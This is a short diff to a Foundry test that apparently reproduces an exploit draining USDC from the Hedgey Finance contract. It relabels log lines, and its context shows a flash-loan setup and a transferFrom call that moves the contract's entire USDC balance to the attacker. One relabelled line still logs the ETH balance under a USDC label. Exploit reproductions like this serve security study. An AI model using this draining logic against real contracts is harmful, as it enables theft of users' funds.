@@ -85,7 +85,7 @@ contract HedgeyFinance is Test {
 
     function testExploit() public {
         deal(address(this), 0 ether);
-        emit log_named_decimal_uint("Attacker ETH balance before exploit", address(this).balance, 18);
+        emit log_named_decimal_uint("Attacker USDC balance before exploit", address(this).balance, 18);
 
         address[] memory tokens = new address[](1);
         tokens[0] = address(USDC);
@@ -98,7 +98,7 @@ contract HedgeyFinance is Test {
         uint256 HedgeyFinance_balance = USDC.balanceOf(address(HedgeyFinance));
         USDC.transferFrom(address(HedgeyFinance), address(this), HedgeyFinance_balance);
 
-        emit log_named_decimal_uint("Attacker ETH balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
+        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
     }
 
     function receiveFlashLoan(
